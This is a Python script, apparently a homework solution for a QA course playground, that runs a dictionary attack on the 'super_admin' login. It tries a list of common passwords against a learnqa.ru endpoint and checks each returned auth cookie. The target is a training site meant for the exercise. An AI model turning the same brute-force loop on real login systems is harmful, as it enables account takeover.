import requests

login = 'super_admin'

password_list = [
    'password', '123456', '12345678', '12345', 'qwerty',
    'abc123', 'football', 'monkey', '123456789', '111111',
    '1234567', 'letmein', 'dragon', 'baseball', '1234',
    'sunshine', 'iloveyou', 'trustno1', 'princess', 'adobe123',
    'welcome', 'login', 'admin', 'solo', '1q2w3e4r',
    'master', 'photoshop', '1qaz2wsx', 'qwertyuiop',
    'ashley', 'mustang', '121212', 'starwars', '654321',
    'bailey', 'access', 'flower', '555555', 'passw0rd',
    'lovely', 'jesus', 'password1', 'superman', 'hello',
    'charlie', '888888', '696969', 'hottie', 'freedom',
    'aa123456', 'qazwsx', 'ninja', 'azerty', 'loveme',
    'whatever', 'donald', 'batman', 'zaq1zaq1', '000000',
    'Football', '123qwe'
]

def get_auth_cookie(login, password):
    """Получение авторизационной куки"""
    url = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
    response = requests.post(url, data={'login': login, 'password': password})

    if not response.ok:
        print(f'Ошибка при вызове {url}: {response.status_code}')
        return None

    try:
        return response.cookies['auth_cookie']
    except KeyError:
        print('Куки auth_cookie не найдена')
        return None


def check_authorization(auth_cookie):
    """Проверка авторизации"""
    url = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'
    cookies = {'auth_cookie': auth_cookie}
    response = requests.get(url, cookies=cookies)

    if not response.ok:
        print(f'Ошибка при вызове {url}: {response.status_code}')
        return False

    if response.text == 'You are authorized':
        return True
    else:
        return False


for password in password_list:
    print(f"Проверяю пароль: {password}")

    auth_cookie = get_auth_cookie(login, password)

    if auth_cookie is None:
        continue

    if check_authorization(auth_cookie):
        print(f"Верный пароль найден: {password}")
        break